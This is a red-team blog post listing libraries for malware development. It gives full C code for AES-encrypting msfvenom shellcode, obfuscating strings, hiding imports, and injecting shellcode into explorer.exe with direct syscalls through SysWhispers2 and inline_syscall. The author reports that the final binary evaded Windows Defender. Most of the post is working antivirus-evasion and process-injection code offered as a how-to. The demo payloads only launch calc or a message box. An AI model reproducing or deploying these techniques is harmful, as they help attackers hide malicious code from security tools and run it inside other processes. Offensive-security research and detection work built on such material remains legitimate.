# https://captmeelo.com/redteam/maldev/2022/02/16/libraries-for-maldev.html

[![](https://captmeelo.com/static/img/avatar.jpg)](https://captmeelo.com/)

# Capt. Meelo

An infosec guy who's constantly seeking for knowledge.

* * *

**Navigation** - [Home](https://captmeelo.com/)
- [Red Team](https://captmeelo.com/category/redteam)
- [Malware Dev](https://captmeelo.com/category/maldev)
- [Pen Test](https://captmeelo.com/category/pentest)
- [Mobile](https://captmeelo.com/category/mobile)
- [Exploit Dev](https://captmeelo.com/category/exploitdev)
- [Talks](https://captmeelo.com/category/talks)
- [Research](https://captmeelo.com/category/research)
- [About Me](https://captmeelo.com/about/)

16 Feb 2022 » [redteam](https://captmeelo.com/category/redteam), [maldev](https://captmeelo.com/category/maldev)

The use of libraries for development is great especially if you’re a beginner and wanted something that will surely work right out of the box and wanted to save time.

In this post, I’ll share some of the libraries that I found easy to use and useful during my malware development journey.

## tiny-AES-c

When writing malware, it’s a must to encrypt your shellcode. Otherwise, your malware won’t even pass the static analysis. One of the recommended ways of encrypting the shellcode is by using AES, and one of the easiest ways to implement this is by using the [kokke/tiny-AES-c](https://github.com/kokke/tiny-AES-c) library.

To use this library, just add the following header and source files to your project.

- [aes.hpp](https://raw.githubusercontent.com/kokke/tiny-AES-c/master/aes.hpp)
- [aes.h](https://raw.githubusercontent.com/kokke/tiny-AES-c/master/aes.h)
- [aes.c](https://raw.githubusercontent.com/kokke/tiny-AES-c/master/aes.c)

The following shows an example of how to AES-encrypt (using CBC mode) your shellcode and its corresponding output.

```
#include <Windows.h>
#include <stdio.h>
#include "lib/aes.hpp"

int main()
{
	// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c
	unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";
	SIZE_T shellcodeSize = sizeof(shellcode);

	unsigned char key[] = "Captain.MeeloIsTheSuperSecretKey";
	unsigned char iv[] = "\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98";

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, iv);
	AES_CBC_encrypt_buffer(&ctx, shellcode, shellcodeSize);

	printf("Encrypted buffer:\n");

	for (int i = 0; i < shellcodeSize - 1; i++) {
		printf("\\x%02x", shellcode[i]);
	}

	printf("\n");
}
```

[![AES-encrypted Shellcode](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/aes-enc-shellcode.png)](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/aes-enc-shellcode.png "aes-enc-shellcode")

To decrypt the encrypted shellcode, simply used the `AES_CBC_decrypt_buffer()` function.

Other AES libraries also exist like the following:

- [SergeyBel/AES](https://github.com/SergeyBel/AES)
- [kkAyataka/plusaes](https://github.com/kkAyataka/plusaes)

## skCrypter

[skadro-official/skCrypter](https://github.com/skadro-official/skCrypter) is a compile-time, user-mode and kernel-mode string crypter library. It uses XOR algorithm with a randomized key and has protection against default XOR brute-forcing.

But why do we need to encrypt/obfuscate our strings? This is done to “hide” some of the arfifacts of your malware. While it may help a little bit against average reverse engineers, obfuscating strings is still a good idea.

As an example, take a look at the following code which dynamically resolves the `NtDelayExecution` function via `GetModuleHandleA` and `GetProcAddress` to perform a “sleep” routine.

```
#include <Windows.h>
#include <stdio.h>

int main()
{
	typedef NTSTATUS(WINAPI* pNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
	pNtDelayExecution NtDelayExecution = (pNtDelayExecution)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");

	int msDelaynumber = 10000;
	LARGE_INTEGER  delayInterval;
	delayInterval.QuadPart = -10000 * msDelaynumber;
	NtDelayExecution(FALSE, &delayInterval);

	printf("Done!\n");
}
```

If we compile the above code and look for the “`ntdll.dll`” and “`NtDelayExecution`” strings, they are visible.

[![Unobfuscated Strings](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/skcrypter-unobfuscated.png)](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/skcrypter-unobfuscated.png "skcrypter-unobfuscated")

If we used functions that are considered malicious, such as the combination of `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`, then our malware might not even pass the static analysis phase of an AV.

This is where the library [skadro-official/skCrypter](https://github.com/skadro-official/skCrypter) comes into play. To use it, just import the header file `skCrypter.h` and place the strings you wanted to obfuscate within the `skCrypt()` function.

As a demo, the previous code was modified to hide both the “`ntdll.dll`” and “`NtDelayExecution`” strings using the `skCrypter.h` library:

```
#include <Windows.h>
#include <stdio.h>
#include "lib/skCrypter.h"

int main()
{
	typedef NTSTATUS(WINAPI* pNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
	pNtDelayExecution NtDelayExecution = (pNtDelayExecution)GetProcAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtDelayExecution"));

	int msDelaynumber = 10000;
	LARGE_INTEGER  delayInterval;
	delayInterval.QuadPart = -10000 * msDelaynumber;
	NtDelayExecution(FALSE, &delayInterval);

	printf("Done!\n");
}
```

As we can see, the strings disappeared within the binary.

[![Obfuscated Strings](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/skcrypter-obfuscated.png)](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/skcrypter-obfuscated.png "skcrypter-obfuscated")

I also found the following string encryption libraries, though I haven’t used/tested them:

- [JustasMasiulis/xorstr](https://github.com/JustasMasiulis/xorstr)
- [qis/xorstr](https://github.com/qis/xorstr)
- [TyrarFox/encstr](https://github.com/TyrarFox/encstr)
- [pyj2323/StrCrypt](https://github.com/pyj2323/StrCrypt)

## lazy\_importer

WinAPI functions used by binaries are listed in the binary’s **Import Address Table (IAT)**. This is not good in terms of evasion since most anti-malware solutions reads the binary’s **IAT** and checks for the presence of dangerous/malicious functions imported/used.

```
#include <Windows.h>

int main()
{

    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(si) };

    CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
```

For example, if the above code was compiled, the function `CreateProcessW` is listed in the **IAT** and is flagged by [PEStudio](https://www.winitor.com/download/).

[![CreateProcessW Lsited in IAT](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/func-in-iat.png)](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/func-in-iat.png "func-in-iat")

This artifact can be easily hidden by utilizing the [JustasMasiulis/lazy\_importer](https://github.com/JustasMasiulis/lazy_importer) header. Using it is as simple as importing the header file `lazy_importer.hpp` and invoking the `LI_FN()` function. For example:

```
#include <Windows.h>
#include "lib/lazy_importer.hpp"

int main()
{

    PROCESS_INFORMATION pi;
    STARTUPINFO si = { sizeof(si) };

    LI_FN(CreateProcessW)(L"C:\\Windows\\System32\\notepad.exe", nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
```

> _**NOTE:** Change `NULL` values to `nullptr` otherwise you’ll get a compilation error._

If we look at the **IAT** again, the `CreateProcessW` function is not listed anymore.

[![CreateProcessW Gone from IAT](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/no-func-in-iat.png)](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/no-func-in-iat.png "no-func-in-iat")

The following could also be used as an alternative library to dynamically import functions and modules:

- [AmJayden/Lazy-Importer](https://github.com/AmJayden/Lazy-Importer)

## SysWhisper2

If you’ve been into AV/EDR evasion, I’m sure you’re aware that using **syscalls** is a well-known method to bypass detection controls (such as “User-land Hooking”) by jumping into kernel-mode. And if you heard about **syscalls**, most likely you’re familiar with the tool [jthuraisamy/SysWhispers2](https://github.com/jthuraisamy/SysWhispers2).

To use the tool, just run the python script `syswhispers.py` with the “ **Nt\***” functions you want to use to generate the required files. For example:

```
$ python3 syswhispers.py -f NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtClose -o syscalls

                  .                         ,--.
,-. . . ,-. . , , |-. o ,-. ,-. ,-. ,-. ,-.    /
`-. | | `-. |/|/  | | | `-. | | |-' |   `-. ,-'
`-' `-| `-' ' '   ' ' ' `-' |-' `-' '   `-' `---
     /|                     |  @Jackson_T
    `-'                     '  @modexpblog, 2021

SysWhispers2: Why call the kernel when you can whisper?

Complete! Files written to:
        syscalls.h
        syscalls.c
        syscallsstubs.asm
```

Then do the following:

1. Copy the generated H/C/ASM files into the project folder.
2. In Visual Studio, go to Project → Build Customizations… and enable MASM.
3. In the Solution Explorer, add the .h and .c/.asm files to the project as header and source files, respectively.
4. Go to the properties of the ASM file, and set the Item Type to Microsoft Macro Assembler.
5. Ensure that the project platform is set to x64. 32-bit projects are not supported at this time.

The “ **Nt\***” functions can now be used. For example:

```
#include <Windows.h>
#include "lib/syscalls.h"

int main(int argc, char* argv[])
{
	// PID of explorer.exe
	DWORD pid = 11256;

	// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c
	unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";
	SIZE_T shellcodeSize = sizeof(shellcode);

	HANDLE hProcess;
	OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
	CLIENT_ID clientId = { (HANDLE)pid, NULL };
	NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

	LPVOID baseAddress = NULL;
	NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	NtWriteVirtualMemory(hProcess, baseAddress, &shellcode, sizeof(shellcode), NULL);

	HANDLE hThread;
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);

	NtClose(hProcess);
	NtClose(hThread);

	return 0;
}
```

The downside of using this tool is that it’s already signatured by AV, though it can still be bypassed as mentioned in my [previous post](https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html).

> _For x86 syscalls, [mai1zhi2/SysWhispers2\_x86](https://github.com/mai1zhi2/SysWhispers2_x86) could be used._

## inline\_syscall

Aside from being detected by AVs, the other thing that I don’t like with [jthuraisamy/SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) is the additional task of re-running the tool and re-importing the generated files every time I need to add or use a new “ **Nt\***” functions.

Good thing, [JustasMasiulis/inline\_syscall](https://github.com/JustasMasiulis/inline_syscall) solves this issue. To use it, simply import the following files as header files:

- [in\_memory\_init.hpp](https://github.com/JustasMasiulis/inline_syscall/raw/master/include/in_memory_init.hpp)
- [inline\_syscall.hpp](https://github.com/JustasMasiulis/inline_syscall/raw/master/include/inline_syscall.hpp)
- [inline\_syscall.inl](https://github.com/JustasMasiulis/inline_syscall/raw/master/include/inline_syscall.inl)

Then call the initialization function `jm::init_syscalls_list()` before using the `INLINE_SYSCALL(function_pointer)` and `INLINE_SYSCALL_T(function_type)` macros.

> _NOTE: If you’re using Visual Studio, make sure to use `LLVM (clang-cl)` as the **Platform Toolset**._ [![Setting the Platform Toolset](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/inline-syscall-clang.png)](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/inline-syscall-clang.png "inline-syscall-clang")

Here’s an example code that utilizes the `INLINE_SYSCALL` macro:

```
#include <Windows.h>
#include "lib/in_memory_init.hpp"

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

NTSTATUS NtOpenProcess(OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL);

NTSTATUS NtAllocateVirtualMemory(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect);

NTSTATUS NtWriteVirtualMemory(IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

NTSTATUS NtCreateThreadEx(OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

NTSTATUS NtClose(IN HANDLE Handle);

int main(int argc, char* argv[])
{
	jm::init_syscalls_list();

	// PID of explorer.exe
	DWORD pid = 4396;

	// msfvenom --payload windows/x64/messagebox TEXT="Hello there." EXITFUNC=thread -f c
	unsigned char shellcode[] = "\x9c\x28\xe1\x84\x90\x9f\x9f\x9f\x88\xb0\x60\x60\x60\x21\x31\x21\x30\x32\x31\x36\x28\x51\xb2\x05\x28\xeb\x32\x00\x5e\x28\xeb\x32\x78\x5e\x28\xeb\x32\x40\x5e\x28\xeb\x12\x30\x5e\x28\x6f\xd7\x2a\x2a\x2d\x51\xa9\x28\x51\xa0\xcc\x5c\x01\x1c\x62\x4c\x40\x21\xa1\xa9\x6d\x21\x61\xa1\x82\x8d\x32\x21\x31\x5e\x28\xeb\x32\x40\x5e\xeb\x22\x5c\x28\x61\xb0\x5e\xeb\xe0\xe8\x60\x60\x60\x28\xe5\xa0\x14\x0f\x28\x61\xb0\x30\x5e\xeb\x28\x78\x5e\x24\xeb\x20\x40\x29\x61\xb0\x83\x3c\x28\x9f\xa9\x5e\x21\xeb\x54\xe8\x28\x61\xb6\x2d\x51\xa9\x28\x51\xa0\xcc\x21\xa1\xa9\x6d\x21\x61\xa1\x58\x80\x15\x91\x5e\x2c\x63\x2c\x44\x68\x25\x59\xb1\x15\xb6\x38\x5e\x24\xeb\x20\x44\x29\x61\xb0\x06\x5e\x21\xeb\x6c\x28\x5e\x24\xeb\x20\x7c\x29\x61\xb0\x5e\x21\xeb\x64\xe8\x28\x61\xb0\x21\x38\x21\x38\x3e\x39\x3a\x21\x38\x21\x39\x21\x3a\x28\xe3\x8c\x40\x21\x32\x9f\x80\x38\x21\x39\x3a\x5e\x28\xeb\x72\x89\x29\x9f\x9f\x9f\x3d\x29\xa7\xa1\x60\x60\x60\x60\x5e\x28\xed\xf5\x7a\x61\x60\x60\x5e\x2c\xed\xe5\x47\x61\x60\x60\x28\x51\xa9\x21\xda\x25\xe3\x36\x67\x9f\xb5\xdb\x80\x7d\x4a\x6a\x21\xda\xc6\xf5\xdd\xfd\x9f\xb5\x28\xe3\xa4\x48\x5c\x66\x1c\x6a\xe0\x9b\x80\x15\x65\xdb\x27\x73\x12\x0f\x0a\x60\x39\x21\xe9\xba\x9f\xb5\x28\x05\x0c\x0c\x0f\x40\x14\x08\x05\x12\x05\x4e\x60\x2d\x05\x13\x13\x01\x07\x05\x22\x0f\x18\x60";
	SIZE_T shellcodeSize = sizeof(shellcode);

	// XOR-decrypt the shellcode
	char key = '`';
	for (int i = 0; i < sizeof(shellcode) - 1; i++) {
		shellcode[i] = shellcode[i] ^ key;
	}

	HANDLE hProcess;
	OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
	CLIENT_ID clientId = { (HANDLE)pid, NULL };
	INLINE_SYSCALL(NtOpenProcess)(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

	LPVOID baseAddress = NULL;
	INLINE_SYSCALL(NtAllocateVirtualMemory)(hProcess, &baseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	INLINE_SYSCALL(NtWriteVirtualMemory)(hProcess, baseAddress, &shellcode, sizeof(shellcode), NULL);

	HANDLE hThread;
	INLINE_SYSCALL(NtCreateThreadEx)(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);

	INLINE_SYSCALL(NtClose)(hProcess);
	INLINE_SYSCALL(NtClose)(hThread);

	return 0;
}
```

> _**NOTE:** Make sure to create the necessary structs and typedefs as this tool won’t do it for you, unlike [jthuraisamy/SysWhispers2](https://github.com/jthuraisamy/SysWhispers2)._

> _**TIP:** Use [jthuraisamy/SysWhispers2](https://github.com/jthuraisamy/SysWhispers2) to generate the required structs and typedefs, then utilize [JustasMasiulis/inline\_syscall](https://github.com/JustasMasiulis/inline_syscall) when using syscalls._

If we run the compiled binary against Windows Defender, it was not detected (at the time of writing) compared to the binary generated with [jthuraisamy/SysWhispers2](https://github.com/jthuraisamy/SysWhispers2).

[![inline_syscall not Detected by Win Defender](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/inline-syscall-not-detected.png)](https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/inline-syscall-not-detected.png "inline-syscall-not-detected")

## Conclusion

That’s it for now! I know I may have missed some libraries, so if you know some easy to use libraries for malware development, feel free to let me know and I can add them here.

Huge thanks to all the people who are dedicating their time writing and open-sourcing tools, as well as those who keep sharing their knowledge and research. And if you can, **please support and sponsor their work**.

Share this on →

Post Button

Facebook

[![](https://static.xx.fbcdn.net/rsrc.php/v4/yn/r/GzgedhmzSQa.png)Share6](https://www.facebook.com/sharer/sharer.php?kid_directed_site=0&sdk=joey&u=https%3A%2F%2Fcapt-meelo.github.io%2Fredteam%2Fmaldev%2F2022%2F02%2F16%2Flibraries-for-maldev.html&display=popup&ref=plugin&src=share_button)

#### Related Posts

- [Lessons Learned from Cloning Windows Binaries and Code Signing Implants](https://capt-meelo.github.io//redteam/maldev/2022/11/07/cloning-signing.html) (Categories: [redteam](https://captmeelo.com/category/redteam), [maldev](https://captmeelo.com/category/maldev))
- [Writing an Independent Malware](https://capt-meelo.github.io//redteam/maldev/2022/10/17/independent-malware.html) (Categories: [redteam](https://captmeelo.com/category/redteam), [maldev](https://captmeelo.com/category/maldev))
- [Making NtCreateUserProcess Work](https://capt-meelo.github.io//redteam/maldev/2022/05/10/ntcreateuserprocess.html) (Categories: [redteam](https://captmeelo.com/category/redteam), [maldev](https://captmeelo.com/category/maldev))
- [Adventures with KernelCallbackTable Injection](https://capt-meelo.github.io//redteam/maldev/2022/04/21/kernelcallbacktable-injection.html) (Categories: [redteam](https://captmeelo.com/category/redteam), [maldev](https://captmeelo.com/category/maldev))
- [Quick & Lazy Malware Development](https://capt-meelo.github.io//redteam/maldev/2021/12/15/lazy-maldev.html) (Categories: [redteam](https://captmeelo.com/category/redteam), [maldev](https://captmeelo.com/category/maldev))
- [Picky PPID Spoofing](https://capt-meelo.github.io//redteam/maldev/2021/11/22/picky-ppid-spoofing.html) (Categories: [redteam](https://captmeelo.com/category/redteam), [maldev](https://captmeelo.com/category/maldev))

[« Quick & Lazy Malware Development](https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html) [Adventures with KernelCallbackTable Injection »](https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html)

Twitter Widget Iframe